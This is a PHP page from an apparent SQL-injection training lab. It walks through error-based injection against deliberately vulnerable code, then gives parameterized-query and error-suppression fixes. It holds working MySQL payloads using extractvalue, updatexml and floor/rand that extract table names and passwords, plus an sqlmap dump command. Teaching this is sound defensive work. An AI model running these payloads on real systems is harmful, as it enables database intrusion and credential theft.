<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Error-Based Injection</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">3. Error-Based Injection</h2>
  <span class="badge bg-danger">Intermediate</span>
  <span class="badge bg-secondary">Error Channel</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>Error-based injection uses deliberate syntax errors to force the database engine to include sensitive data inside the error message itself. If the application displays raw DB errors (common during development or with verbose logging), the attacker extracts data without needing UNION or blind techniques.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/error_based.php</code> | <strong>Key functions:</strong> <code>extractvalue()</code>, <code>updatexml()</code>, <code>floor()</code></p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$uid = $_GET['uid'] ?? '';

// Raw integer injection point
$sql = "SELECT id, firstname, lastname, email, account_type
        FROM user WHERE id = {$uid}";

// PDO error mode set to EXCEPTION + error shown to user
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$result = $pdo->query($sql);   // Exception message is displayed</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Confirm error-based injection</h6>
    <p>Enter a quote or arithmetic error to confirm the error message is reflected:</p>
    <div class="bg-light p-2 rounded mb-3"><code>1'</code> → DB error shown in page</div>

    <h6 class="fw-bold">Step 2 — Extract the DB version</h6>
    <div class="bg-light p-2 rounded mb-1"><code>1 AND extractvalue(1, concat(0x7e, (SELECT version())))</code></div>
    <p class="text-muted small mb-3">The <code>~</code> (hex 0x7e) acts as a delimiter. The version string appears in the XPATH error: <em>XPATH syntax error: '~8.0.28'</em></p>

    <h6 class="fw-bold">Step 3 — Extract the current database name</h6>
    <div class="bg-light p-2 rounded mb-3"><code>1 AND extractvalue(1, concat(0x7e, (SELECT database())))</code></div>

    <h6 class="fw-bold">Step 4 — List all tables</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>1 AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))</code>
    </div>

    <h6 class="fw-bold">Step 5 — Extract a specific password</h6>
    <div class="bg-light p-2 rounded mb-3"><code>1 AND extractvalue(1, concat(0x7e, (SELECT password FROM user LIMIT 1)))</code></div>

    <h6 class="fw-bold">Step 6 — Use <code>updatexml()</code> as an alternative</h6>
    <div class="bg-light p-2 rounded mb-1"><code>1 AND updatexml(1, concat(0x7e, (SELECT version())), 1)</code></div>
    <p class="text-muted small mb-3">Same result via a different XML function. Useful when <code>extractvalue</code> is blocked.</p>

    <h6 class="fw-bold">Step 7 — floor() + RAND() technique (classic)</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>1 AND (SELECT 1 FROM (SELECT COUNT(*), concat((SELECT database()), 0x3a, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) y)</code>
    </div>

    <a href="?action=error_based" class="btn btn-sm btn-outline-danger">Open Error-Based Demo →</a>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix</strong></div>
  <div class="card-body">
    <p><strong>1. Parameterized query — stops the injection:</strong></p>
<pre class="bg-light p-3 rounded"><code>$stmt = $pdo->prepare("SELECT id, firstname FROM user WHERE id = :id");
$stmt->execute([':id' => (int) $uid]);
$row = $stmt->fetch();</code></pre>
    <p class="mt-3"><strong>2. Suppress error output — stops the data channel:</strong></p>
<pre class="bg-light p-3 rounded"><code>// In production: never show raw errors to users
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);

// Log errors server-side instead
error_log($e->getMessage());</code></pre>
    <p class="mb-0 text-success"><strong>Both fixes are needed</strong> — parameterization prevents injection; error suppression closes the data channel.</p>
  </div>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Additional Defences</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>PHP <code>display_errors = Off</code></strong> in <code>php.ini</code> for production.</li>
      <li><strong>Custom error pages</strong> — show a generic "Something went wrong" page, never raw exceptions.</li>
      <li><strong>Centralized error logging</strong> — use a service like Sentry so errors are captured without being exposed.</li>
      <li><strong>Disable <code>extractvalue</code> / <code>updatexml</code> via MySQL user grants</strong> — though this is defence-in-depth, not a primary fix.</li>
    </ul>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools</strong></div>
  <div class="card-body">
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=error_based&uid=1" \
  --technique=E -D sql_demo --dump --batch</pre>
  </div>
</div>
